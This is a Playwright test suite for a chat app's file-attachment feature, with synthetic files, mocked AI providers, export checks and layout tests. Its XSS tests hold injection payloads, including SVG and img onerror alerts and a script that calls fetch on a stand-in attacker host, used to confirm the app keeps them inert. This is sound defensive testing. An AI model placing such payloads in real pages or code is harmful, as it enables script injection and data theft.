import { test, expect } from '@playwright/test';
import { readFile } from 'node:fs/promises';

// Reuse the running preview and the project's Edge configuration. All external
// traffic is denied unless an explicit synthetic provider response handles it.
const BASE = 'http://127.0.0.1:3000';
const GEMINI = 'https://generativelanguage.googleapis.com/v1beta';
const OPENAI = 'https://attachments-provider.test/v1';
const KEY = 'synthetic-attachment-key-never-export';
const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQIHWP4z8DwHwAFgAI/ScLbtAAAAABJRU5ErkJggg==', 'base64');
const PDF = Buffer.from('%PDF-1.4\n% Synthetic local attachment\n%%EOF');
const TEXT = 'Synthetic local project notes.\nconst greeting = "hello";\n';
const image = (name = 'sample.png') => ({ name, mimeType: 'image/png', buffer: PNG });
const pdf = (name = 'brief.pdf') => ({ name, mimeType: 'application/pdf', buffer: PDF });
const text = (name = 'notes.js', content = TEXT) => ({ name, mimeType: 'text/plain', buffer: Buffer.from(content) });
const response = (protocol, content = 'Synthetic attachment answer') => protocol === 'gemini'
  ? { candidates: [{ content: { role: 'model', parts: [{ text: content }] }, finishReason: 'STOP' }] }
  : { choices: [{ message: { role: 'assistant', content }, finish_reason: 'stop' }] };

async function workspace(page) {
  return page.evaluate(async () => (await import('./storage.js')).createStore().load());
}
async function activeChat(page) {
  const saved = await workspace(page);
  return saved?.conversations.find(chat => chat.id === saved.activeId);
}
async function setup(page, { protocol = 'gemini', connected = true, search = false } = {}) {
  const state = { requests: [], unexpected: [], errors: [], protocol, endpoint: protocol === 'gemini' ? GEMINI : OPENAI };
  page.on('pageerror', error => state.errors.push(error.message));
  await page.route('**/*', route => {
    if (route.request().url().startsWith(`${BASE}/`)) return route.continue();
    state.unexpected.push(route.request().url());
    return route.abort();
  });
  await page.route('https://cdn.jsdelivr.net/**', route => route.fulfill({ contentType: 'text/javascript', body: '' }));
  await page.route(`${state.endpoint}/models*`, route => route.fulfill({ json: protocol === 'gemini'
    ? { models: [{ name: 'models/gemini-flash', supportedGenerationMethods: ['generateContent'] }] }
    : { data: [{ id: 'synthetic/chat' }] } }));
  await page.goto(BASE);
  await expect(page.locator('#attach-files')).toHaveAttribute('aria-label', 'Attach images or files');
  await expect(page.locator('#api-protocol-gemini')).toBeEnabled();
  if (connected) {
    await page.locator('#toggle-settings').click();
    await page.locator(`#api-protocol-${protocol}`).check();
    await page.locator('#endpoint').fill(state.endpoint);
    await page.locator('#api-key').fill(KEY);
    await page.locator('#fetch-models').click();
    await expect(page.locator('#model-count')).toHaveText('1 model available');
    await page.locator('#settings-tab-tools').click();
    await page.locator('#parallel-search').setChecked(search);
    await page.locator('#close-settings').click();
  }
  return state;
}
async function provider(page, state, respond = route => route.fulfill({ json: response(state.protocol) })) {
  const path = state.protocol === 'gemini' ? `${state.endpoint}/models/*:generateContent` : `${state.endpoint}/chat/completions`;
  await page.route(path, route => {
    const request = route.request();
    expect(request.headers()[state.protocol === 'gemini' ? 'x-goog-api-key' : 'authorization']).toBe(state.protocol === 'gemini' ? KEY : `Bearer ${KEY}`);
    state.requests.push(request.postDataJSON());
    return respond(route, state.requests.length);
  });
}
async function attach(page, files, count = files.length) {
  await page.locator('#attachment-input').setInputFiles(files);
  await expect(page.locator('#attachment-list .attachment-card')).toHaveCount(count);
  await expect(page.locator('#attach-files')).toBeEnabled();
}
async function settled(page, answer = 'Synthetic attachment answer') {
  await expect(page.locator('#stop-button')).toBeHidden();
  await expect(page.locator('.message.model').last()).toContainText(answer);
  await expect(page.locator('#attach-files')).toBeEnabled();
}
function clean(state) {
  expect(state.unexpected, 'No upload, OAuth, public-file or unmocked provider request').toEqual([]);
  expect(state.errors).toEqual([]);
}
async function transfer(page, selector, type, files) {
  await page.locator(selector).evaluate((target, { type, files }) => {
    const data = new DataTransfer();
    for (const file of files) data.items.add(new File([Uint8Array.from(file.bytes)], file.name, { type: file.mimeType }));
    const event = type === 'paste' ? new ClipboardEvent(type, { clipboardData: data, bubbles: true, cancelable: true })
      : new DragEvent(type, { dataTransfer: data, bubbles: true, cancelable: true });
    target.dispatchEvent(event);
  }, { type, files: files.map(file => ({ name: file.name, mimeType: file.mimeType, bytes: [...file.buffer] })) });
}
async function downloadText(download) {
  expect(await download.failure()).toBeNull();
  return readFile(await download.path(), 'utf8');
}

test('picker is accessible, multiple and local; remove restores the empty disconnected composer', async ({ page }) => {
  const state = await setup(page, { connected: false });
  const input = page.locator('#attachment-input');
  await expect(input).toHaveAttribute('type', 'file');
  await expect(input).toHaveAttribute('multiple', '');
  await expect(input).toBeHidden();
  const chooser = page.waitForEvent('filechooser');
  await page.getByRole('button', { name: 'Attach images or files' }).click();
  await (await chooser).setFiles([image(), pdf()]);
  await expect(page.locator('#attachment-list .attachment-card')).toHaveCount(2);
  await expect(page.locator('#attachment-list img')).toHaveAttribute('src', `data:image/png;base64,${PNG.toString('base64')}`);
  await expect(page.locator('#attachment-status')).toHaveAttribute('role', 'status');
  await expect(page.locator('#send-button')).toBeDisabled();
  await page.getByRole('button', { name: 'Remove sample.png', exact: true }).click();
  await expect(page.locator('#attachment-list .attachment-card')).toHaveCount(1);
  await page.getByRole('button', { name: 'Remove brief.pdf', exact: true }).click();
  await expect(page.locator('#attachment-list .attachment-card')).toHaveCount(0);
  await expect(page.locator('#attach-files')).toBeFocused();
  clean(state);
});

test('drop and clipboard files append to the composer without replacing typed text', async ({ page }) => {
  const state = await setup(page);
  await page.locator('#message-input').fill('Keep this draft');
  await transfer(page, '#chat-form', 'drop', [pdf()]);
  await expect(page.locator('#attachment-list .attachment-card')).toHaveCount(1);
  await expect(page.locator('#attach-files')).toBeEnabled();
  await transfer(page, '#message-input', 'paste', [image(), text()]);
  await expect(page.locator('#attachment-list .attachment-card')).toHaveCount(3);
  await expect(page.locator('#message-input')).toHaveValue('Keep this draft');
  await expect(page.locator('#send-button')).toBeEnabled();
  clean(state);
});

test('files-only Gemini sends inline bytes, stores canonical history and metadata-only transcript', async ({ page }) => {
  const state = await setup(page);
  await provider(page, state);
  await attach(page, [image(), pdf(), text()]);
  await expect(page.locator('#message-input')).toHaveValue('');
  await expect(page.locator('#send-button')).toBeEnabled();
  await page.locator('#send-button').click();
  await settled(page);
  const parts = state.requests[0].contents[0].parts;
  expect(parts).toEqual(expect.arrayContaining([
    { inlineData: { mimeType: 'image/png', data: PNG.toString('base64') } },
    { inlineData: { mimeType: 'application/pdf', data: PDF.toString('base64') } },
  ]));
  expect(parts.some(part => part.text?.includes(JSON.stringify(TEXT).slice(1, -1)))).toBe(true);
  expect(JSON.stringify(state.requests[0])).not.toContain('prismAttachment');
  await expect(page.locator('.message.user .attachment-card')).toHaveCount(3);
  await expect(page.locator('#attachment-list .attachment-card')).toHaveCount(0);
  await expect.poll(async () => (await activeChat(page))?.history.length).toBe(2);
  const chat = await activeChat(page);
  const records = chat.history[0].parts.filter(part => part.prismAttachment).map(part => part.prismAttachment);
  expect(records.map(record => record.kind)).toEqual(['image', 'pdf', 'text']);
  expect(records[0].data).toBe(PNG.toString('base64'));
  expect(records[2].text).toBe(TEXT);
  expect(chat.transcript[0].attachments).toEqual(records.map(({ id, name, mimeType, size, kind }) => ({ id, name, mimeType, size, kind })));
  expect(chat.draftAttachments).toEqual([]);
  clean(state);
});

test('OpenAI mixed files use image_url, PDF file_data and inert text with no public URLs', async ({ page }) => {
  const state = await setup(page, { protocol: 'openai' });
  await provider(page, state);
  await attach(page, [image(), pdf(), text()]);
  await page.locator('#message-input').fill('Summarize these local files');
  await page.locator('#send-button').click();
  await settled(page);
  const content = state.requests[0].messages.find(message => message.role === 'user').content;
  expect(content).toEqual(expect.arrayContaining([
    { type: 'image_url', image_url: { url: `data:image/png;base64,${PNG.toString('base64')}` } },
    { type: 'file', file: { filename: 'brief.pdf', file_data: `data:application/pdf;base64,${PDF.toString('base64')}` } },
  ]));
  expect(content.filter(part => part.type === 'text').map(part => part.text).join('\n')).toContain(JSON.stringify(TEXT).slice(1, -1));
  expect(JSON.stringify(content)).not.toMatch(/https?:\/\//);
  clean(state);
});

test('tool continuation and a later turn retain the original local image', async ({ page }) => {
  const state = await setup(page, { protocol: 'openai', search: true });
  const methods = [];
  await page.route('https://search.parallel.ai/mcp', route => {
    const body = route.request().postDataJSON(); methods.push(body.method);
    return route.fulfill(body.method === 'notifications/initialized' ? { status: 202, body: '' } : { json: { jsonrpc: '2.0', id: body.id, result: body.method === 'initialize'
      ? { protocolVersion: '2025-03-26' }
      : { content: [{ type: 'text', text: 'Synthetic search result' }] } } });
  });
  await provider(page, state, (route, count) => route.fulfill({ json: count === 1
    ? { choices: [{ message: { role: 'assistant', content: null, tool_calls: [{ id: 'attachment_search_1', type: 'function', function: { name: 'parallel_search', arguments: JSON.stringify({ objective: 'Find context', search_queries: ['synthetic context'] }) } }] }, finish_reason: 'tool_calls' }] }
    : response('openai') }));
  await attach(page, [image()]);
  await page.locator('#send-button').click();
  await settled(page);
  expect(state.requests).toHaveLength(2);
  expect(state.requests[1].messages.find(message => message.role === 'user').content).toEqual(state.requests[0].messages.find(message => message.role === 'user').content);
  expect(state.requests[1].messages.at(-1)).toMatchObject({ role: 'tool', tool_call_id: 'attachment_search_1' });
  await page.locator('#message-input').fill('Now compare it');
  await page.locator('#send-button').click();
  await expect(page.locator('.message.model')).toHaveCount(2);
  await settled(page);
  expect(state.requests[2].messages.find(message => message.role === 'user').content).toEqual(state.requests[0].messages.find(message => message.role === 'user').content);
  expect(methods).toEqual(['initialize', 'notifications/initialized', 'tools/call']);
  clean(state);
});

for (const outcome of ['success', 'failure', 'stop']) {
  test(`pending ${outcome} disables attachment mutation and preserves a newly typed draft`, async ({ page }) => {
    const state = await setup(page);
    let pending;
    await provider(page, state, route => { pending = route; });
    await attach(page, [image()]);
    await page.locator('#message-input').fill('Original attachment question');
    await page.locator('#send-button').click();
    await expect.poll(() => state.requests.length).toBe(1);
    await expect(page.locator('#attach-files')).toBeDisabled();
    await expect(page.locator('#attachment-input')).toBeDisabled();
    await expect(page.locator('#attachment-list .attachment-card')).toHaveCount(0);
    await expect(page.locator('.message.user .attachment-card')).toHaveCount(1);
    await expect(page.getByRole('button', { name: 'Remove sample.png', exact: true })).toHaveCount(0);
    await page.locator('#message-input').fill('A follow-up typed while waiting');
    if (outcome === 'stop') {
      await page.locator('#stop-button').click();
      await expect(page.locator('#chat-notice')).toContainText(/stopped/i);
      await pending.abort().catch(() => {});
    } else if (outcome === 'failure') {
      await pending.fulfill({ status: 429, json: { error: { message: 'Synthetic rate limit' } } });
      await expect(page.locator('#chat-notice')).toContainText('429');
    } else {
      await pending.fulfill({ json: response('gemini') });
      await settled(page);
    }
    await expect(page.locator('#stop-button')).toBeHidden();
    await expect(page.locator('#message-input')).toHaveValue(outcome === 'success' ? 'A follow-up typed while waiting' : /Original attachment question[\s\S]*A follow-up typed while waiting/);
    await expect(page.locator('#attachment-list .attachment-card')).toHaveCount(outcome === 'success' ? 0 : 1);
    await expect(page.locator('.message.user')).toHaveCount(outcome === 'success' ? 1 : 0);
    await expect(page.locator('#attach-files')).toBeEnabled();
    clean(state);
  });
}

test('a failed files-only send restores the original files and can be retried once', async ({ page }) => {
  const state = await setup(page);
  await provider(page, state, (route, count) => route.fulfill(count === 1 ? { status: 503, body: 'Synthetic unavailable' } : { json: response('gemini') }));
  await attach(page, [pdf()]);
  await page.locator('#send-button').click();
  await expect(page.locator('#chat-notice')).toContainText('503');
  await expect(page.locator('#attachment-list .attachment-card')).toHaveCount(1);
  await expect(page.locator('#send-button')).toBeEnabled();
  await page.locator('#send-button').click();
  await settled(page);
  expect(state.requests).toHaveLength(2);
  expect(state.requests[1].contents).toEqual(state.requests[0].contents);
  clean(state);
});

test('attachment-only drafts survive reload and remain isolated between conversations', async ({ page }) => {
  const state = await setup(page);
  await attach(page, [image(), text()]);
  await expect.poll(async () => (await activeChat(page))?.draftAttachments?.length).toBe(2);
  const first = await activeChat(page);
  expect(first.draftAttachments[0].data).toBe(PNG.toString('base64'));
  await page.reload();
  await expect(page.locator('#attachment-list .attachment-card')).toHaveCount(2);
  await expect(page.locator('#send-button')).toBeEnabled();
  await page.locator('#new-chat').click();
  await expect(page.locator('#attachment-list .attachment-card')).toHaveCount(0);
  await expect(page.locator('#message-input')).toHaveValue('');
  await attach(page, [pdf('other-conversation.pdf')]);
  await expect.poll(async () => (await activeChat(page))?.draftAttachments?.[0]?.name).toBe('other-conversation.pdf');
  await page.locator(`.conversation-item[data-chat-id="${first.id}"]`).click();
  await expect(page.locator('#attachment-list .attachment-card')).toHaveCount(2);
  await expect(page.locator('#attachment-list')).not.toContainText('other-conversation.pdf');
  clean(state);
});

test('sent previews resolve from history after reload; JSON includes payload and Markdown only metadata', async ({ page }) => {
  const state = await setup(page);
  await provider(page, state);
  await attach(page, [image(), text()]);
  await page.locator('#send-button').click();
  await settled(page);
  await page.reload();
  await expect(page.locator('.message.user .attachment-card')).toHaveCount(2);
  await expect(page.locator('.message.user img')).toHaveAttribute('src', `data:image/png;base64,${PNG.toString('base64')}`);
  const markdownDownload = page.waitForEvent('download');
  await page.locator('#export-chat').click();
  const markdown = await downloadText(await markdownDownload);
  expect(markdown).toContain('sample.png');
  expect(markdown).toContain('notes.js');
  expect(markdown).not.toContain(PNG.toString('base64'));
  expect(markdown).not.toContain(TEXT);
  await page.locator('#toggle-settings').click();
  await page.locator('#settings-tab-data').click();
  const jsonDownload = page.waitForEvent('download');
  await page.locator('#export-all').click();
  const json = await downloadText(await jsonDownload);
  const exported = JSON.parse(json);
  expect(json).toContain(PNG.toString('base64'));
  expect(json).toContain(JSON.stringify(TEXT).slice(1, -1));
  expect(json).not.toContain(KEY);
  expect(exported.settings).toBeUndefined();
  expect(json).not.toMatch(/access_token|refresh_token|client_secret|apiKey/);
  clean(state);
});

const invalidFiles = [
  { name: 'unsupported SVG', file: () => ({ name: 'active.svg', mimeType: 'image/svg+xml', buffer: Buffer.from('<svg onload="alert(1)"/>') }), error: /unsupported|SVG/i },
  { name: 'spoofed PNG signature', file: () => ({ name: 'fake.png', mimeType: 'image/png', buffer: Buffer.from('<html>not an image</html>') }), error: /bytes|match|type|signature/i },
  { name: 'file above 4 MiB', file: () => ({ name: 'large.pdf', mimeType: 'application/pdf', buffer: Buffer.concat([PDF, Buffer.alloc(4 * 1024 * 1024)]) }), error: /4 MiB/i },
  { name: 'text above 512 KiB', file: () => text('large.txt', 'x'.repeat(512 * 1024 + 1)), error: /512 KiB/i },
  { name: 'invalid UTF-8 text', file: () => ({ name: 'binary.txt', mimeType: 'text/plain', buffer: Buffer.from([0xc3, 0x28]) }), error: /UTF-8/i },
];
test('unsupported, spoofed, oversized and non-UTF8 files fail validation before network', async ({ page }) => {
  const state = await setup(page);
  await provider(page, state);
  for (const invalid of invalidFiles) {
    await test.step(invalid.name, async () => {
      await page.locator('#attachment-input').setInputFiles(invalid.file());
      await expect(page.locator('#attachment-status')).toContainText(invalid.error);
      await expect(page.locator('#attachment-list .attachment-card')).toHaveCount(0);
      await expect(page.locator('#send-button')).toBeDisabled();
      expect(state.requests).toEqual([]);
    });
  }
  clean(state);
});

test('count and total byte limits reject whole batches without losing the existing valid file', async ({ page }) => {
  const state = await setup(page);
  await provider(page, state);
  await attach(page, [image()]);
  await page.locator('#attachment-input').setInputFiles([1, 2, 3, 4].map(number => text(`extra-${number}.txt`)));
  await expect(page.locator('#attachment-status')).toContainText(/at most 4|4 files/i);
  await expect(page.locator('#attachment-list .attachment-card')).toHaveCount(1);
  const large = name => ({ name, mimeType: 'application/pdf', buffer: Buffer.concat([PDF, Buffer.alloc(3 * 1024 * 1024)]) });
  await page.locator('#attachment-input').setInputFiles([large('one.pdf'), large('two.pdf'), large('three.pdf')]);
  await expect(page.locator('#attachment-status')).toContainText(/8 MiB/i);
  await expect(page.locator('#attachment-list .attachment-card')).toHaveCount(1);
  expect(state.requests).toEqual([]);
  clean(state);
});

test('the 12 MiB history attachment budget rejects a new send before network', async ({ page }) => {
  const state = await setup(page);
  await provider(page, state);
  await page.locator('#message-input').fill('Synthetic history budget fixture');
  await expect.poll(async () => (await activeChat(page))?.draft).toBe('Synthetic history budget fixture');
  await page.evaluate(async () => {
    const store = (await import('./storage.js')).createStore();
    const saved = await store.load();
    const chat = saved.conversations.find(item => item.id === saved.activeId);
    const size = 4 * 1024 * 1024;
    const bytes = '%PDF-' + 'x'.repeat(size - 5);
    const data = btoa(bytes);
    chat.history = [0, 1, 2].flatMap(index => [
      { role: 'user', parts: [{ prismAttachment: { id: `budget_${index}`, name: `history-${index}.pdf`, mimeType: 'application/pdf', size, kind: 'pdf', data } }] },
      { role: 'model', parts: [{ text: 'Synthetic history response' }] },
    ]);
    chat.draft = '';
    chat.draftAttachments = [];
    chat.endpoint = 'https://generativelanguage.googleapis.com/v1beta';
    chat.protocol = 'gemini';
    await store.save(saved);
  });
  await page.reload();
  await expect(page.locator('#attach-files')).toBeEnabled();
  await attach(page, [pdf('over-history-budget.pdf')]);
  await page.locator('#send-button').click();
  await expect(page.locator('#chat-notice')).toContainText(/12 MiB|history.*(?:limit|budget)|conversation.*(?:limit|budget)/i);
  await expect(page.locator('#attachment-list .attachment-card')).toHaveCount(1);
  expect(state.requests).toEqual([]);
  clean(state);
});

test('malicious filenames and HTML remain inert in draft and sent text previews', async ({ page }) => {
  const state = await setup(page);
  await provider(page, state);
  const name = '<img src=x onerror=alert(1)>.html';
  const payload = '<script>window.attachmentExecuted=true;fetch("https://attachment-attacker.test/steal")</script><img src="https://attachment-attacker.test/pixel" onerror="alert(1)"><iframe src="https://attachment-attacker.test/frame"></iframe>';
  const dialogs = [];
  page.on('dialog', async dialog => { dialogs.push(dialog.message()); await dialog.dismiss(); });
  await attach(page, [text(name, payload)]);
  await expect(page.locator('#attachment-list strong')).toHaveText(name);
  await page.locator('#attachment-list summary').click();
  await expect(page.locator('#attachment-list pre')).toHaveText(payload);
  await expect(page.locator('#attachment-list img, #attachment-list iframe, #attachment-list script')).toHaveCount(0);
  await page.locator('#send-button').click();
  await settled(page);
  await page.locator('.message.user summary').click();
  await expect(page.locator('.message.user pre')).toHaveText(payload);
  await expect(page.locator('.message.user img, .message.user iframe, .message.user script')).toHaveCount(0);
  expect(await page.evaluate(() => window.attachmentExecuted)).toBeUndefined();
  expect(dialogs).toEqual([]);
  clean(state);
});

for (const [name, viewport] of [['desktop', { width: 1440, height: 1000 }], ['mobile', { width: 390, height: 844 }]]) {
  test(`${name} attachment composer and sent previews fit the viewport`, async ({ page }) => {
    await page.setViewportSize(viewport);
    const state = await setup(page);
    await provider(page, state);
    await attach(page, [image('synthetic-palette.png'), pdf('synthetic-design-brief.pdf'), text('synthetic-notes.js')]);
    await page.locator('#message-input').fill('Review these synthetic local files');
    await page.locator('#send-button').click();
    await settled(page);
    await attach(page, [image('next-local-image.png'), text('follow-up-notes.txt')]);
    await page.locator('#message-input').fill('A local-only follow-up draft');
    expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true);
    await expect(page.locator('#attach-files')).toBeInViewport();
    await expect(page.locator('#send-button')).toBeInViewport();
    await page.screenshot({ path: `artifacts/prism-attachments-${name}.png`, fullPage: true, animations: 'disabled' });
    clean(state);
  });
}
